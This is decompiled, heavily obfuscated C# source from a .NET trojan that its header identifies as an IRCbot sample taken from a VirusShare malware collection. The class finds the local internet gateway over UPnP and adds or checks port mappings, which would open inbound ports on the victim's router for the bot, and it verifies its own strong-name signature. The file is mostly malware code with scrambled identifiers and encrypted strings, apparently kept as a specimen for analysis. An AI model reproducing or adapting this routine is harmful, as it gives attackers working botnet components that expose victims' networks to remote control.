// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0006;
using System;
using System.Collections;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace \u000F
{
  internal sealed class \u0003
  {
    private static IPAddress \u0001;
    private static \u0003.\u0003 \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u008F;

    private static \u0003.\u0003 \u0001([In] \u0004.\u0003 obj0)
    {
      IEnumerator enumerator = ((\u000F.\u0008) obj0.Services).GetEnumerator();
      try
      {
        \u0003.\u0003 obj;
        do
        {
          if (!\u008C.\u007E\u0008\u0003((object) enumerator))
            goto label_7;
label_2:
          obj = (\u0003.\u0003) \u0017\u0002.\u007E\u009C\u0003((object) enumerator);
          if (!\u000F.\u0003.\u0001(obj))
            continue;
          goto label_3;
label_7:
          if (false)
            goto label_2;
          else
            goto label_11;
        }
        while (!obj0.HasChildren);
        goto label_5;
label_3:
        return obj;
label_5:
        return \u000F.\u0003.\u0001(obj0.Children);
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0013.\u007E\u009D((object) disposable);
      }
label_11:
      return (\u0003.\u0003) null;
    }

    private static \u0003.\u0003 \u0001([In] \u0005.\u0004 obj0)
    {
      if (true)
        goto label_15;
label_12:
      if (true)
        return (\u0003.\u0003) null;
label_14:
      \u0003.\u0003 obj1;
      return obj1;
label_15:
      IEnumerator enumerator = ((\u000F.\u0006) obj0).GetEnumerator();
      try
      {
        while (\u008C.\u007E\u0008\u0003((object) enumerator))
        {
          \u0003.\u0003 obj2 = \u000F.\u0003.\u0001((\u0004.\u0003) \u0017\u0002.\u007E\u009C\u0003((object) enumerator));
          if (true)
            goto label_6;
label_3:
          \u0003.\u0003 obj3;
          if (obj3 != null)
          {
            obj1 = obj3;
            goto label_14;
          }
          else
            continue;
label_6:
          obj3 = obj2;
          goto label_3;
        }
        goto label_12;
      }
      finally
      {
        IDisposable disposable = enumerator as IDisposable;
        do
        {
          if (disposable != null)
            \u0013.\u007E\u009D((object) disposable);
        }
        while (false);
      }
    }

    private static bool \u0001([In] \u0003.\u0003 obj0) => \u0007.\u0088(obj0.ServiceTypeIdentifier, \u000F.\u0003.\u008F(4312));

    public static bool \u0001()
    {
      \u0002.\u0005 obj;
      do
      {
        \u000F.\u0003.\u0001 = (\u0003.\u0003) null;
        if (true)
        {
          if (true)
            obj = (\u0002.\u0005) \u009C\u0002.\u008A\u0004(\u009B\u0002.\u0089\u0004(new Guid(\u000F.\u0003.\u008F(4377))));
        }
        else
          goto label_5;
      }
      while (false);
      goto label_8;
label_5:
      int num1 = \u000F.\u0003.\u0001 == null ? 1 : 0;
      int num2;
      while (true)
      {
        num2 = num1 == 0 ? 1 : 0;
        if (false)
          num1 = num2;
        else
          break;
      }
      return num2 != 0;
label_8:
      \u000F.\u0003.\u0001 = \u000F.\u0003.\u0001(obj.FindByType(\u000F.\u0003.\u008F(4426), 0U));
      goto label_5;
    }

    public static bool \u0001([In] int obj0, [In] string obj1)
    {
      object[] objArray1;
      if (true)
      {
        if (\u000F.\u0003.\u0001 == null)
          return false;
        int length = 3;
        if (length == 0)
          return length != 0;
        objArray1 = new object[length];
      }
      objArray1[0] = (object) \u000F.\u0003.\u008F(1639);
      objArray1[1] = (object) obj0;
      if (true)
        goto label_13;
label_6:
      object pvOutActionArgs = new object();
label_7:
      object[] vInActionArgs;
      bool flag;
      try
      {
        \u000F.\u0003.\u0001.InvokeAction(\u000F.\u0003.\u008F(4495), (object) vInActionArgs, ref pvOutActionArgs);
        do
        {
          flag = true;
          if (false)
            goto label_7;
        }
        while (false);
      }
      catch
      {
        flag = false;
      }
      return flag;
label_13:
      objArray1[2] = (object) obj1;
      object[] objArray2 = objArray1;
      if (true)
      {
        vInActionArgs = objArray2;
        goto label_6;
      }
      else
        goto label_6;
    }

    public static bool \u0001(
      int externalPort,
      int internalPort,
      string protocol,
      string description,
      int duration = 0)
    {
      if (\u000F.\u0003.\u0001 != null && !\u000F.\u0003.\u0001(externalPort, protocol))
      {
        object[] objArray = new object[8];
        if (true)
        {
          if (false)
            goto label_5;
          else
            goto label_12;
label_3:
          if (true)
          {
            objArray[3] = (object) internalPort;
            objArray[4] = (object) global::\u0003.\u007E\u0005((object) \u000F.\u0003.\u0001);
            objArray[5] = (object) true;
          }
          else
            goto label_11;
label_5:
          objArray[6] = (object) description;
          objArray[7] = (object) duration;
          object[] vInActionArgs = objArray;
          bool flag;
          if (true)
          {
            object pvOutActionArgs = new object();
            try
            {
              \u000F.\u0003.\u0001.InvokeAction(\u000F.\u0003.\u008F(4532), (object) vInActionArgs, ref pvOutActionArgs);
              do
              {
                flag = true;
              }
              while (false);
            }
            catch
            {
              flag = false;
            }
          }
          else
            goto label_3;
label_11:
          return flag;
label_12:
          objArray[0] = (object) \u000F.\u0003.\u008F(1639);
          objArray[1] = (object) externalPort;
          objArray[2] = (object) protocol;
          goto label_3;
        }
      }
      return false;
    }

    static \u0003()
    {
      \u0004.\u0005.\u0001(typeof (\u000F.\u0003));
      bool flag = false;
      Assembly assembly = \u007F.\u0089\u0002();
      int num1 = \u000F.\u0003.\u0001(global::\u0003.\u007E\u0006((object) assembly), true, out flag) ? 1 : 0;
      while (num1 != 0 && flag)
      {
        int num2 = global::\u0005.\u007E\u0082((object) global::\u0003.\u007E\u0007((object) assembly), \u000F.\u0003.\u008F(716)) ? 1 : 0;
        if (false)
          num1 = num2;
        else if (false)
        {
          num1 = num2;
        }
        else
        {
          if (num2 != 0)
          {
            \u000F.\u0003.\u0001 = \u0001.\u0001(true);
            \u000F.\u0003.\u0001 = (\u0003.\u0003) null;
            return;
          }
          break;
        }
      }
      throw new SecurityException(\u000F.\u0003.\u008F(741));
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
